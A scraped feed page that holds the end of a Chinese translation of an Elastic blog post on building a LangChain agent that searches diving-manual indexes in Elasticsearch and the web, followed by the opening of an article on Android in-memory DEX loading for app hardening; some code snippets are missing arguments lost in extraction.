<span class="hljs-number">8</span>.      def <span class="hljs-built_in">search</span>(self, query, index=<span class="hljs-string">"us_navy_dive_manual"</span>, size=<span class="hljs-number">10</span>):
<span class="hljs-number">9</span>.          response = self.client.<span class="hljs-built_in">search</span>(
<span class="hljs-number">10</span>.              index=index,
<span class="hljs-number">11</span>.              body={
<span class="hljs-number">12</span>.                  "query": {
<span class="hljs-number">13</span>.                      "semantic": {
<span class="hljs-number">14</span>.                          "field": <span class="hljs-string">"semantic_content"</span>,
<span class="hljs-number">15</span>.                          <span class="hljs-string">"query"</span>: query
<span class="hljs-number">16</span>.                      }
<span class="hljs-number">17</span>.                  }     
<span class="hljs-number">18</span>.              },
<span class="hljs-number">19</span>.              size=size
<span class="hljs-number">20</span>.          )
<span class="hljs-number">21</span>.          return "\n"<span class="hljs-selector-class">.join</span>(<span class="hljs-selector-attr">[hit[<span class="hljs-string">"_source"</span>]</span><span class="hljs-selector-class">.get</span>("<span class="hljs-selector-tag">body</span>", "No <span class="hljs-selector-tag">Body</span>") 
<span class="hljs-number">22</span>.                              for hit in response<span class="hljs-selector-attr">[<span class="hljs-string">"hits"</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">"hits"</span>]</span>])

`AI写代码!<span class="hljs-selector-attr">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>第二个工具是 Googler 类，它调用 Google Custom Search API 执行一般的网页搜索。</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  class Googler:
2.      def __init__(self):
<span class="hljs-attr">3.          self.service</span> = build(<span class="hljs-string">'customsearch'</span>, <span class="hljs-string">'v1'</span>, developerKey=os.getenv(<span class="hljs-string">"GCP_API_KEY"</span>))

5.      def scrape(self, url):
6.          try:
<span class="hljs-attr">7.              response</span> = requests.get(url, timeout=<span class="hljs-number">10</span>)
8.              if <span class="hljs-attr">response.status_code</span> == <span class="hljs-number">200</span>:
<span class="hljs-attr">9.                  soup</span> = BeautifulSoup(response.text, <span class="hljs-string">'html.parser'</span>)
10.                  for script in soup(<span class="hljs-section">["script", "style"]</span>):
11.                      script.decompose()
<span class="hljs-attr">12.                  text</span> = soup.get_text()
<span class="hljs-attr">13.                  lines</span> = (line.strip() for line in text.splitlines())
<span class="hljs-attr">14.                  chunks</span> = (phrase.strip() for line in lines for phrase in line.split(<span class="hljs-string">"  "</span>))
15.                  return '\n'.join(chunk for chunk in chunks if chunk)<span class="hljs-section">[:5000]</span>
16.              return None
17.          except:
18.              return None

20.      def search(self, query, <span class="hljs-attr">n</span>=<span class="hljs-number">5</span>):
<span class="hljs-attr">21.          results</span> = self.service.cse().list(q=query, cx=os.getenv(<span class="hljs-string">"GCP_PSE_ID"</span>), num=n).execute()
<span class="hljs-attr">22.          scraped_data</span> = []
23.          for item in results.get('items', <span class="hljs-section">[]</span>):
<span class="hljs-attr">24.              url</span> = item[<span class="hljs-string">'link'</span>]
<span class="hljs-attr">25.              title</span> = item[<span class="hljs-string">'title'</span>]
<span class="hljs-attr">26.              content</span> = self.scrape(url) or item[<span class="hljs-string">'snippet'</span>]
27.              scraped_data.append(f"Page: {title}\nURL: {url}\n\n{content}\n")
28.          return "\n".join(scraped_data)

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>然后我为 agent 创建了一组工具。每个工具的描述是 prompt engineering 的重要部分，因为 agent 在选择用于响应用户查询的工具时主要会参考这些描述。</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  tools = [
<span class="hljs-bullet">2.</span>      Tool(
<span class="hljs-bullet">3.</span>          ,
<span class="hljs-bullet">4.</span>          func=lambda q: googler.search(q, n=3),
<span class="hljs-bullet">5.</span>          description="Search the web for information. Use for current events or general knowledge or to complement with additional information."
<span class="hljs-bullet">6.</span>      ),
<span class="hljs-bullet">7.</span>      Tool(
<span class="hljs-bullet">8.</span>          ,
<span class="hljs-bullet">9.</span>          func=lambda q: elastic.search(q, index="us<span class="hljs-emphasis">_navy_</span>dive<span class="hljs-emphasis">_manual"),
10.          description="Search the Operations Dive Manual. Use for diving procedures, advanced or technical operational planning, resourcing, and technical information."
11.      ),
12.      Tool(
13.          ,
14.          func=lambda q: elastic.search(q, index="diving_</span>safety<span class="hljs-emphasis">_manual"),
15.          description="Search the Diving Safety Manual. Use for generic diving safety protocols and best practices."
16.      )
17.  ]

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</span></code></pre>
<p>接下来，我使用 AzureChatOpenAI 抽象定义一个 LLM：</p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  llm</span> = AzureChatOpenAI(
<span class="hljs-attr">2.      azure_endpoint</span>=os.getenv(<span class="hljs-string">"AZURE_OPENAI_ENDPOINT"</span>),
<span class="hljs-attr">3.      api_key</span>=os.getenv(<span class="hljs-string">"AZURE_OPENAI_API_KEY"</span>),
<span class="hljs-attr">4.      api_version</span>=os.getenv(<span class="hljs-string">"AZURE_OPENAI_API_VERSION"</span>),
5.      deployment_),
<span class="hljs-attr">6.      streaming</span>=<span class="hljs-literal">False</span>
7.  )

`AI写代码
</code></pre>
<p>并且为 LLM 创建一个自定义 prompt，告诉它如何使用这些工具及其输出。</p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  prompt</span> = PromptTemplate.from_template(<span class="hljs-string">"""Answer the following questions as best you can. You have access to the following tools:
2.  {tools}
3.  You should use multiple tools in conjunction to promote completeness of information.
4.  Be comprehensive in your answer.
5.  Use the following format:
6.  Question: the input question you must answer
7.  Thought: you should always think about what to do
8.  Action: the action to take, should be one of [{tool_names}]
9.  Action Input: the input to the action
10.  Observation: the result of the action
11.  ... (this Thought/Action/Action Input/Observation can repeat N times)
12.  Thought: I now know the final answer
13.  Final Answer: the final answer to the original input question
14.  Question: {input}
15.  {agent_scratchpad}"""</span>)

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>最后，我定义了 agent，将 LLM、prompt 和工具集传入，并将其集成到其余的 UI 中。</p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  agent</span> = create_react_agent(llm, tools, prompt)
<span class="hljs-attr">2.  agent_executor</span> = AgentExecutor(agent=agent, tools=tools, verbose=<span class="hljs-literal">False</span>)

`AI写代码
</code></pre>
<p>到此，我们就可以测试我们的 agent 知识库了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b318121295347bdbd2f0aa307f7b8e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767850877&amp;x-signature=NDH2Ywok1HcmXOlAZHEgn616cXA%3D" alt="" loading="lazy"/></p>
<p>为 agentic 知识库实现的 UI。</p>
<h3 data-id="heading-5">测试 1：从特定知识库检索知识</h3>
<p>首先，我们应测试知识库组件是否按预期工作。让我们从提出一个详细的技术问题开始。agent 应该选择正确的知识库，检索一些信息，并用它来生成回答。</p>
<pre><code class="hljs language-bash" lang="bash">`List of recommended equipment <span class="hljs-keyword">for</span> ice/cold water diving operations`AI写代码
</code></pre>
<p>UI 显示了 Agent 的思考过程，它的第一个想法是查阅潜水安全手册：</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  Thought: To provide a comprehensive list of recommended equipment for ice 
<span class="hljs-bullet">2.</span>  or cold water diving operations, I should consult specialized diving 
<span class="hljs-bullet">3.</span>  manuals that cover operational procedures and safety protocols. 
<span class="hljs-bullet">4.</span>  This will ensure that I include all necessary items for safety and 
<span class="hljs-bullet">5.</span>  efficiency in such challenging environments. 

<span class="hljs-bullet">7.</span>  Action: NavyDiveManual

<span class="hljs-bullet">9.</span>  Action Input: "recommended equipment for ice cold water 
<span class="hljs-bullet">10.</span>  diving operations"

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>Agent 使用 NavyDiveManual 工具对 us_navy_dive_manual 索引进行语义搜索。结果是如下信息：</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  CHAPTER 11 — Ice and Cold Water Diving Operations   11-9
<span class="hljs-bullet">2.</span>  A detailed reconnaissance of the dive site will provide the 
<span class="hljs-bullet">3.</span>  planner with information that is helpful in deciding what ancillary equipment is 
<span class="hljs-bullet">4.</span>  required. Diving under ice will require special accessory equipment such as a line 
<span class="hljs-bullet">5.</span>  with lights/strobes for under  water navigation, ice-cutting tools, platforms, engine 
<span class="hljs-bullet">6.</span>  protection kits, and stainless steel ice screws, quick draw, and carabineers.
<span class="hljs-bullet">7.</span>  The method of cutting the hole through the ice depends on ice thickness and availability 
<span class="hljs-bullet">8.</span>  of equipment. Normally, two or more of the following tools are used: hand 
<span class="hljs-bullet">9.</span>  ice chipper, ice handsaw, ice auger, chain saw, thermal ice cutter or blasting equipment. 
<span class="hljs-bullet">10.</span>  In addition, equipment to lift the ice block, remove the slush, and mark ...

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>LLM 然后使用这些信息生成回答：</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  The recommended equipment for ice and cold water diving operations includes:

<span class="hljs-bullet">3.</span>  Thermal Protection:

<span class="hljs-bullet">5.</span>  * Wet suit or Variable Volume Dry Suit (VVDS)
<span class="hljs-bullet">6.</span>  * Heavy insulating socks (if using a wet suit)
<span class="hljs-bullet">7.</span>  * Diving Equipment:
<span class="hljs-bullet">8.</span>  * Approved cold water open-circuit SCUBA or closed-circuit UBA

`AI写代码
</code></pre>
<p>回答正是我们想要的，太好了！</p>
<h2 data-id="heading-6">测试 2：迭代优化知识收集</h2>
<p>下一个测试是看看 agent 是否能选择多个知识来源来优化其回答。让我们提出一个更开放性的问题：</p>
<pre><code class="hljs language-sql" lang="sql">`What <span class="hljs-keyword">are</span> the risk factors <span class="hljs-keyword">when</span> snorkeling?`AI写代码
</code></pre>
<p>Agent 的第一个想法是搜索 Google，以获取关于风险因素和危险的具体信息：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">`

<span class="hljs-number">1</span>.  Thought: <span class="hljs-keyword">To</span> provide a comprehensive answer <span class="hljs-keyword">to</span> the risk factors associated <span class="hljs-keyword">with</span> snorkeling, 
<span class="hljs-number">2</span>.  I should gather information <span class="hljs-keyword">on</span> general safety protocols <span class="hljs-built_in">and</span> specific risks <span class="hljs-keyword">from</span> both diving 
<span class="hljs-number">3</span>.  <span class="hljs-built_in">and</span> snorkeling perspectives. I will start <span class="hljs-keyword">by</span> searching <span class="hljs-keyword">for</span> general snorkeling risks <span class="hljs-built_in">and</span> 
<span class="hljs-number">4</span>.  <span class="hljs-keyword">then</span> look <span class="hljs-keyword">into</span> specific safety guidelines related <span class="hljs-keyword">to</span> diving <span class="hljs-built_in">and</span> snorkeling. 

<span class="hljs-number">6</span>.  Action: WebSearch  
<span class="hljs-number">7</span>.  Action Input: <span class="hljs-string">"risk factors when snorkeling"</span>

`AI写代码
</code></pre>
<p>这会返回如下网页结果：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">`

<span class="hljs-number">1</span>.  Factors Contributing <span class="hljs-keyword">to</span> Snorkel Drowning <span class="hljs-keyword">in</span> Hawai<span class="hljs-comment">'i - PMC</span>
<span class="hljs-number">2</span>.  URL: https://pmc.ncbi.nlm.nih.gov/articles/PMC8899085/
<span class="hljs-number">3</span>.  Causes <span class="hljs-keyword">of</span> the extraordinarily high <span class="hljs-built_in">and</span> increasing incidence <span class="hljs-keyword">of</span> snorkeler drownings <span class="hljs-keyword">in</span> Hawai<span class="hljs-comment">'i </span>
<span class="hljs-number">4</span>.  have remained unexplained <span class="hljs-keyword">for</span> years. Defining the mechanisms <span class="hljs-built_in">and</span> factors predisposing <span class="hljs-keyword">to</span> 
<span class="hljs-number">5</span>.  drowning <span class="hljs-keyword">while</span> snorkeling <span class="hljs-built_in">is</span> needed <span class="hljs-keyword">to</span> provide recommendations <span class="hljs-keyword">to</span> substantially mitigate 
<span class="hljs-number">6</span>.  the incidence <span class="hljs-keyword">of</span> this form <span class="hljs-keyword">of</span> preventable death. The mechanisms <span class="hljs-keyword">of</span> drowning are described 
<span class="hljs-number">7</span>.  <span class="hljs-built_in">and</span> insight <span class="hljs-keyword">into</span> the predisposing factors are explored <span class="hljs-keyword">in</span> this study...

`AI写代码
</code></pre>
<p>然后 agent 选择查阅 diving_safety_manual，并采取相应操作来获取安全规程和指导方针。</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  Action: DivingSafetyManual  
<span class="hljs-bullet">2.</span>  Action Input: "snorkeling safety protocols"

`AI写代码
</code></pre>
<p>这会从 DivingSafetyManual 工具返回相关信息：</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  Pre-Snorkel briefing       
<span class="hljs-bullet">2.</span>  Immediately before snorkelling commences, and using site diagrams or 
<span class="hljs-bullet">3.</span>  photos as appropriate, the snorkeller supervisor  should emphasise 
<span class="hljs-bullet">4.</span>  the following points: 
<span class="hljs-bullet">5.</span>  • On-site environmental conditions  
<span class="hljs-bullet">6.</span>  • Boundaries of the snorkelling area 
<span class="hljs-bullet">7.</span>  • Times when snorkelli ng is being conducted 
<span class="hljs-bullet">8.</span>  • Specific site hazards 
<span class="hljs-bullet">9.</span>  • Location of lookout 
<span class="hljs-bullet">10.</span>  • Emergency and recall signals 
<span class="hljs-bullet">11.</span>  • Buddy and guided group  procedures

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>最后，LLM 提供了一个全面的回答，包含风险因素和安全指导方针：</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  The risk factors when snorkeling include:
<span class="hljs-bullet">2.</span>  Environmental Conditions: Strong currents, waves, and marine life can pose 
<span class="hljs-bullet">3.</span>  immediate threats. Snorkelers should be aware of local weather and water 
<span class="hljs-bullet">4.</span>  conditions before entering.
<span class="hljs-bullet">5.</span>  Physical Fitness: Snorkeling is a strenuous activity that can be 
<span class="hljs-bullet">6.</span>  challenging for individuals with pre-existing medical conditions 
<span class="hljs-bullet">7.</span>  such as heart disease, respiratory issues (e.g., asthma), or those 
<span class="hljs-bullet">8.</span>  who are not strong swimmers.
<span class="hljs-bullet">9.</span>  ...
<span class="hljs-bullet">10.</span>  To mitigate these risks, snorkelers should engage in pre-snorkel briefings, 
<span class="hljs-bullet">11.</span>  wear personal flotation devices, ensure proper equipment checks, and 
<span class="hljs-bullet">12.</span>  maintain awareness of their environment and physical limits.

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<h2 data-id="heading-7">测试 3：搜索超出范围的问题</h2>
<p>最后一个测试是看看当用户提出的问题明显超出已准备知识库的范围时会发生什么。让我们询问一个特定的潜水产品：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`Tell me about the Apeks XTX50 regulator`</span>AI写代码
</code></pre>
<p>Agent 的第一个想法是查找外部网页以获取相关信息：</p>
<pre><code class="hljs language-less" lang="less">`

<span class="hljs-number">1</span>.  <span class="hljs-selector-tag">Thought</span>: <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">need</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">gather</span> <span class="hljs-selector-tag">information</span> <span class="hljs-selector-tag">about</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">Apeks</span> <span class="hljs-selector-tag">XTX50</span> <span class="hljs-selector-tag">regulator</span>, 
<span class="hljs-number">2</span>.  <span class="hljs-selector-tag">including</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">features</span>, <span class="hljs-selector-tag">specifications</span>, <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">performance</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">diving</span> <span class="hljs-selector-tag">conditions</span>. 
<span class="hljs-number">3</span>.  <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">begin</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">web</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">comprehensive</span> <span class="hljs-selector-tag">details</span>.  
<span class="hljs-number">4</span>.  <span class="hljs-selector-tag">Action</span>: <span class="hljs-selector-tag">WebSearch</span>  
<span class="hljs-number">5</span>.  <span class="hljs-selector-tag">Action</span> <span class="hljs-selector-tag">Input</span>: "<span class="hljs-selector-tag">Apeks</span> <span class="hljs-selector-tag">XTX50</span> <span class="hljs-selector-tag">regulator</span> <span class="hljs-selector-tag">review</span> <span class="hljs-selector-tag">features</span> <span class="hljs-selector-tag">specifications</span>"

`<span class="hljs-selector-tag">AI</span>写代码
</code></pre>
<p>它从商业网站和潜水爱好者网站中发现了大量信息，并返回了技术规格和用户反馈：</p>
<pre><code class="hljs language-markdown" lang="markdown">`1.  The Apeks XTX50 is a high-performance scuba diving regulator designed for 
<span class="hljs-bullet">2.</span>  divers who seek reliability and advanced features at a moderate price point. 
<span class="hljs-bullet">3.</span>  Here are the key features and specifications:
<span class="hljs-bullet">4.</span>  Features:
<span class="hljs-bullet">5.</span>  First Stage:
<span class="hljs-bullet">6.</span>  Utilizes the DST (Diver Adjustable) first stage with an environmentally 
<span class="hljs-bullet">7.</span>  sealed design to prevent water ingress. Over-balanced diaphragm technology 
<span class="hljs-bullet">8.</span>  provides superior performance as divers descend, with medium pressure gas 
<span class="hljs-bullet">9.</span>  increasing faster than ambient pressure.
<span class="hljs-bullet">10.</span>  ...
<span class="hljs-bullet">11.</span>  Divers appreciate the XTX50's reliability and comfort, making it a popular 
<span class="hljs-bullet">12.</span>  choice for both recreational and technical diving.
<span class="hljs-bullet">13.</span>  The regulator is lauded for its performance in colder conditions, with 
<span class="hljs-bullet">14.</span>  many users noting its effectiveness during deep dives.
<span class="hljs-bullet">15.</span>  Some divers have raised concerns about the availability of parts for maintenance, 
<span class="hljs-bullet">16.</span>  as Apeks does not sell parts directly to consumers.
<span class="hljs-bullet">17.</span>  ...` AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>Agent 没有选择搜索关注操作规划的 US Navy Dive Manual，也没有使用 DivingSafetyManual。</p>
<h2 data-id="heading-8">结论</h2>
<p>在传统的 RAG 实现中，我们可能会选择强制 LLM 同时搜索并使用所有三个数据源的信息，但这会因为引入无关信息的噪声而降低准确性。使用 agentic 知识库，我们可以看到 LLM 根据用户意图和上下文针对性地搜索特定的知识源。agent 能够通过在初始搜索的基础上整合从其他来源收集的信息来优化知识收集。</p>
<p>Agent 还能够处理超出其准备数据范围的问题，同时能够排除与查询无关的知识库 —— 这是对传统 RAG 模型的显著增强。</p>
<p>这个 agent 知识库的概念提供了一种优雅的方式，将多种不同来源整合成一个连贯且全面的系统。下一步可以扩展可执行操作的范围以及可参考信息的多样性。引入事实核查和交叉引用的工作流将有助于整体可靠性，而像计算这样的专业能力工具将是一个非常有趣的探索方向。</p>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fagent-knowledge-base-langchain-elasticsearch" title="https://www.elastic.co/search-labs/blog/agent-knowledge-base-langchain-elasticsearch" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labs…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android第二代加固技术原理详解（附源码）]]></title>    <link>https://juejin.cn/post/7589935326781669410</link>    <guid>https://juejin.cn/post/7589935326781669410</guid>    <pubDate>2026-01-01T05:32:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781669410" data-draft-id="7588034035287277583" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android第二代加固技术原理详解（附源码）"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-01T05:32:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="见前行"/> <meta itemprop="url" content="https://juejin.cn/user/2365804756076541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android第二代加固技术原理详解（附源码）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2365804756076541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    见前行
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T05:32:35.000Z" title="Thu Jan 01 2026 05:32:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android第二代加固技术原理详解（附源码）</h2>
<h3 data-id="heading-1">前言</h3>
<p>在上一篇<a href="https://juejin.cn/post/7543901300719681570" target="_blank" title="https://juejin.cn/post/7543901300719681570">Android第一代加固技术原理详解（附源码）
</a>，我们详细介绍了Android第一代加固的实现原理——<strong>落地加载方案</strong>。该方案通过将加密的源APK解密后写入私有目录，再使用<code>DexClassLoader</code>加载的方式实现代码保护。</p>
<p>然而，一代加固存在一个致命缺陷：<strong>解密后的DEX文件需要落地到文件系统</strong>。这意味着攻击者可以通过以下方式轻松获取源程序代码：</p>
<ol>
<li><strong>Root设备直接读取</strong>：访问<code>/data/user/0/&lt;package_name&gt;/app_tmp_dex/</code>目录</li>
<li><strong>Hook文件操作</strong>：监控<code>FileOutputStream.write()</code>等方法</li>
<li><strong>监控私有目录</strong>：使用<code>inotify</code>等机制监听文件创建事件</li>
</ol>
<p>为了解决这一安全隐患，<strong>二代加固应运而生</strong>——核心思想是<strong>DEX不落地，直接在内存中加载</strong>。（本系列文章承前启后，为更好理解下文内容，建议先理解上一篇<a href="https://juejin.cn/post/7543901300719681570" target="_blank" title="https://juejin.cn/post/7543901300719681570">Android第一代加固技术原理详解（附源码）
</a>，再看本文，可有事半功倍之效。）</p>
<hr/>
<h3 data-id="heading-2">一代 vs 二代：核心差异对比</h3>








































<table><thead><tr><th>特性</th><th>一代加固 (V1)</th><th>二代加固 (V2)</th></tr></thead><tbody><tr><td><strong>DEX存储</strong></td><td>解密后写入磁盘<code>Source.apk</code></td><td>仅存在于内存<code>ByteBuffer</code></td></tr><tr><td><strong>ClassLoader</strong></td><td><code>DexClassLoader</code></td><td><code>InMemoryDexClassLoader</code></td></tr><tr><td><strong>核心API</strong></td><td><code>DexClassLoader(apkPath,...)</code></td><td><code>InMemoryDexClassLoader(ByteBuffer[],...)</code></td></tr><tr><td><strong>安全级别</strong></td><td>中等（文件可被dump）</td><td>较高（内存加载不落地）</td></tr><tr><td><strong>最低版本</strong></td><td>Android 4.0+ (API 14)</td><td>Android 5.0+ (API 21)</td></tr><tr><td><strong>Multidex</strong></td><td>需额外处理</td><td>原生支持<code>ByteBuffer[]</code></td></tr></tbody></table>
<h4 data-id="heading-3">一代加固的安全缺陷回顾</h4>
